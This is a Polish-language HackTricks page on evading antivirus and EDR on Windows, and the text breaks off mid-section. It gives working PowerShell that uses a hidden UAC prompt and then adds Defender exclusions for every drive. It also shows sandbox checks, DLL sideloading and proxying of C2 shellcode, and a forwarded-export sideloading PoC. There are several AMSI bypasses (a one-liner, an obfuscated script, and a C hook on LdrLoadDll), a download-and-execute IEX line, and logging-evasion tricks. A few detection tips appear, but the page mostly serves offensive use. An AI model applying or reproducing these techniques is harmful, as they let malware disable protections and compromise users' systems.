# Omijanie programu antywirusowego (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymywania działania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymywania działania Windows Defendera przez podszywanie się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed modyfikacją Defendera

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podwyższenie uprawnień**, a dopiero potem unieszkodliwiają Defendera. Schemat jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, używając `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie własny proces, używając czasownika `RunAs`, aby wywołać oczekiwany monit zgody UAC, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` dla każdej litery dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoader maksymalizują luki w ochronie Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, dzięki którym skanowanie obejmujeć nie będzie żadnego profilu użytkownika, katalogu systemowego ani dysku wymiennego:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony w dowolnym miejscu na dysku zostanie pominięty**.
- Wykluczenie rozszerzenia `.sys` jest przygotowane na przyszłość — atakujący zachowują możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego ingerowania w Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal zgłaszają, że „antivirus jest aktywny”, mimo że ochrona w czasie rzeczywistym nie sprawdza tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodologia omijania AV**

Obecnie programy AV stosują różne metody sprawdzania, czy plik jest złośliwy: wykrywanie statyczne, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR-ów także analizę behawioralną.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub sekwencji bajtów w pliku binarnym albo skrypcie, a także na odczytywaniu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że korzystanie ze znanych, publicznych narzędzi może ułatwić ich wykrycie, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na ominięcie tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić niektóre ciągi znaków w pliku binarnym lub skrypcie, aby ominąć AV, ale może to być czasochłonne, zależnie od tego, co próbujesz poddać obfuskacji.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istnieć znane złośliwe sygnatury, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania, czy Windows Defender wykrywa plik statycznie, jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli ono plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może dokładnie wskazać, które ciągi znaków lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam tę [playlistę na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznym metodom omijania AV.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu pliku binarnego przez AV w sandboxie i obserwowaniu złośliwej aktywności (np. prób odszyfrowania i odczytania haseł z przeglądarki, wykonania minidumpa LSASS itp.). Może to być nieco trudniejsze, ale oto kilka sposobów na uniknięcie wykrycia przez sandboxy.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie opóźnienia mogą utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie — zależnie od jego implementacji.
- **Sprawdzanie zasobów komputera** Sandboxy zwykle dysponują bardzo ograniczonymi zasobami (np. < 2GB RAM), bo w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę procesora, a nawet prędkość wentylatorów — nie wszystko będzie zaimplementowane w sandboxie.
- **Kontrole specyficzne dla komputera** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z określoną przez siebie. Jeśli się nie zgadza, program może się zamknąć.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defendera to HAL9TH. Możesz więc sprawdzić nazwę komputera w swoim malware przed detonacją. Jeśli jest to HAL9TH, oznacza to, że znajdujesz się w sandboxie Defendera, więc program może się zamknąć.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących unikania sandboxów:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz skorzystać z innego, mniej znanego projektu, który również zrzuca LSASS?

Prawdopodobnie właściwa jest ta druga odpowiedź. Mimikatz jest zapewne jednym z najczęściej oznaczanych przez AV i EDR-у rodzajów malware, a być może wręcz najczęściej oznaczanym. Sam projekt jest świetny, ale omijanie AV przy jego użyciu to koszmar. Dlatego poszukaj alternatyw, które pozwolą osiągnąć twój cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze i, proszę, naprawdę **NIE PRZESYŁAJ PLIKÓW DO VIRUSTOTAL**, jeśli zależy ci na długofalowym unikaniu wykrycia. Jeśli chcesz sprawdzić, czy dany AV wykrywa twój payload, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz satysfakcjonujący wynik.

## EXE a DLL

Jeśli to możliwe, zawsze **preferuj DLL, aby uniknąć wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach jest to bardzo prosty sposób na uniknięcie wykrycia (oczywiście jeśli twój payload można uruchomić jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma wskaźnik wykryć 4/26 w antiscan.me, podczas gdy payload EXE ma wskaźnik wykryć 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie w antiscan.me zwykłego payloadu EXE z Havoc ze zwykłą DLL z Havoc</p></figcaption></figure>

Teraz pokażemy kilka trików, które pozwolą znacznie skuteczniej ukryć pliki DLL.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loader, umieszczając aplikację ofiary i złośliwy payload obok siebie.

Możesz sprawdzić, które programy są podatne na DLL Sideloading, używając [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Zdecydowanie zalecam samodzielne **wyszukiwanie programów podatnych na DLL Hijack/Sideload**. Ta technika jest dość stealthy, jeśli zostanie poprawnie zastosowana, ale użycie publicznie znanych programów obsługujących DLL Sideload może sprawić, że łatwo zostaniesz wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie oczekiwanej przez program nie wystarczy, by załadować payload, ponieważ program oczekuje, że biblioteka będzie zawierać określone funkcje. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania wykonywane przez program z biblioteki proxy (złośliwej DLL) do oryginalnej DLL, zachowując tym samym funkcjonalność programu i umożliwiając wykonanie payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL o zmienionej nazwie.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [nagranie VOD S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [film ippseca](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych zagadnieniach.

### Nadużywanie przekierowanych eksportów (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje będące w rzeczywistości „forwarders”: zamiast wskazywać kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader Windows:

- Ładuje `TargetDll`, jeśli nie jest jeszcze załadowany
- Rozwiązuje `TargetFunc` z tego modułu

Najważniejsze kwestie:
- Jeśli `TargetDll` jest KnownDLL, jest udostępniany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, obejmująca katalog modułu wykonującego przekierowanie.

Umożliwia to zastosowanie pośredniej metody sideloading: znajdź podpisaną DLL, która eksportuje funkcję przekierowaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść tę podpisaną DLL w tym samym katalogu co kontrolowana przez atakującego DLL o nazwie dokładnie takiej jak nazwa przekierowanego modułu docelowego. Gdy przekierowany eksport zostanie wywołany, loader rozwiąże przekierowanie i załaduje DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w systemie Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisany systemowy plik DLL do folderu, w którym można zapisywać.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwą bibliotekę `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekazywanej dalej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozpoznawania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Przekierowane eksporty możesz wyliczyć za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz spis forwarderów w Windows 11, aby wyszukać potencjalne kandydaty: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL-e ze ścieżek spoza katalogów systemowych, a następnie ładujące pliki non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogów systemowych → `NCRYPTPROV.dll` ze ścieżek zapisywalnych przez użytkownika
- Wymuszaj stosowanie zasad integralności kodu (WDAC/AppLocker) i zabraniaj jednoczesnego zapisu i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do ładowania payloadów, służący do omijania EDR-ów przy użyciu zawieszonych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonywania`

Możesz użyć Freeze, aby po cichu załadować i wykonać swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dzisiaj, jutro może zostać wykryte, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć wiele technik evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-y często umieszczają **user-mode inline hooks** w stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby syscall **direct** lub **indirect**, które ładują poprawny **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania przechwyconego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: umieść instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez odwołania do eksportu `ntdll`).
- **Indirect**: wykonaj skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, aby przejście do jądra wyglądało na pochodzące z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unikaj umieszczania statycznej sekwencji opcode `0F 05` na dysku; wyszukuj sekwencję syscall w czasie wykonywania.

**Odporne na hooki strategie rozwiązywania SSN:**
- **FreshyCalls (VA sort)**: wywnioskuj SSN przez sortowanie stubów syscall według adresu wirtualnego zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: zmapuj czysty `\KnownDlls\ntdll.dll`, odczytaj SSN z jego `.text`, a następnie usuń mapowanie (omija wszystkie hooki w pamięci).
- **RecycledGate**: połącz wnioskowanie SSN na podstawie sortowania VA z walidacją opcode, gdy stub jest czysty; jeśli jest przechwycony, użyj wnioskowania na podstawie VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w czasie wykonywania, bez analizowania przechwyconych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI powstało, aby zapobiegać "[malware bezplikowemu](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV potrafiły skanować tylko **pliki na dysku**, więc jeśli udało się uruchomić payloady **bezpośrednio w pamięci**, AV nie mogło temu zapobiec, ponieważ nie miało wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi komponentami systemu Windows:

- Kontrola konta użytkownika (UAC) (podnoszenie uprawnień plików EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczne wykonywanie kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Pozwala rozwiązaniom antywirusowym sprawdzać zachowanie skryptów, udostępniając ich treść w postaci niezaszyfrowanej i niezakamuflowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że dodaje on przedrostek `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale i tak zostaliśmy wykryci w pamięci przez AMSI.

Ponadto od wersji **.NET 4.8** kod C# również jest skanowany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do załadowania kodu w pamięci. Dlatego do wykonywania kodu w pamięci zaleca się używanie starszych wersji .NET (takich jak 4.7.2 lub niższe), jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI opiera się głównie na wykrywaniu statycznym, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak deobfuskować skrypty, nawet jeśli mają wiele warstw, więc obfuskacja może być złym rozwiązaniem — zależnie od tego, jak została wykonana. Z tego powodu uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, więc zależy to od tego, w jakim stopniu coś zostało oznaczone jako podejrzane.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo przy nim majstrować, nawet działając jako nieuprzywilejowany użytkownik. Ze względu na tę wadę implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Wymuszanie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) sprawi, że bieżący proces nie rozpocznie skanowania. Pierwotnie ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby ograniczyć powszechne stosowanie tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczyła jedna linijka kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Ta linijka została oczywiście wykryta przez samo AMSI, więc aby skorzystać z tej techniki, trzeba ją zmodyfikować.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten wpis prawdopodobnie zostanie wykryty po publikacji, więc jeśli planujesz pozostać niewykrytym, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została pierwotnie odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczanych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG. W ten sposób wynik właściwego skanowania wyniesie 0, co zostanie zinterpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje również wiele innych technik omijania AMSI w powershell. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidne obejście niezależne od języka polega na umieszczeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skanowania.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notatki
- Działa w PowerShell, WScript/CScript i niestandardowych loaderach (we wszystkim, co w przeciwnym razie ładowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Zaobserwowano użycie w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do omijania AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do omijania AMSI, który unika wykrywania przez sygnatury dzięki losowo generowanym funkcjom zdefiniowanym przez użytkownika, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzi takich jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Rejestrowanie PS

Rejestrowanie PowerShell to funkcja, która umożliwia zapisywanie wszystkich poleceń PowerShell wykonanych w systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć rejestrowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz transkrypcję PowerShell i rejestrowanie modułów**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` w Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani wszystkich innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko określonych fragmentów kodu, które zawierają poufne informacje lub muszą być ukryte.

### Dekompilowanie plików binarnych .NET chronionych przez ConfuserEx

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub komercyjne forki) często napotyka się kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca niemal oryginalny IL**, który można następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usunięcie zabezpieczenia przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je wewnątrz statycznego konstruktora *modułu* (`<Module>.cctor`). Modyfikuje również sumę kontrolną PE, przez co każda zmiana powoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby znaleźć zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czyste zestawienie:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – wybiera profil ConfuserEx 2
